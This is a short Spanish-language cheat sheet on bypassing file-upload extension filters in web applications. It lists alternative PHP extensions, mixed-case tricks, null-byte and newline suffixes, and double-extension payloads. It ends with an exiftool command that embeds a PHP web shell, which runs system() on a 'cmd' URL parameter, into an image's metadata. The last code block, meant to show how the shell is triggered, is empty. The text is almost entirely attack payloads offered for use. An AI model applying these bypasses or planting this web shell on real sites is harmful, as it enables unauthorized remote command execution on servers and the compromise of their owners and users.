Al intentar subir un fichero a una web, es posible que no permita ciertas extensiones que pueden resultar maliciosa, como php.

### Extensiones similares

* PHP:
_php_
_php2_
_php3_
_php4_
_php5_
_php6_
_php7_
_phps_
_phps_
_pht_
_phtm_
_phtml_
_pgif_
_shtml_
_htaccess_
_phar_
_inc_
_hphp_
_ctp_
_module_

- PHPv8
_php_
_php4_
_php5_
_phtml_
_module_
_inc_
_hphp_
_ctp_

### Probando mayusculas

En ocasiones se podría utilizar las extensiones anteriores de la siguiente manera: pHp, pHP5...

### Añadir caracteres especiales al final
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\_
- _file._
- _file.php...._
- _file.pHp5...._

### Añadiendo una segunda extension y/o combinando con caracteres especiales
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_

### Esconder PHP en imagen
Lo primero que necesitamos es la imagen que vamos a utilizar para cargar la Shell. Una vez descargada, comenzamos a modificarla.

El comando para ello es:
```bash
exiftool -Comment='<?php echo “<pre>”; system($_GET[‘cmd’]); ?>’ nombre_imagen.extensión
```

luego nos vamos a la url, buscamos la imagen y ponemos:
```bash

```
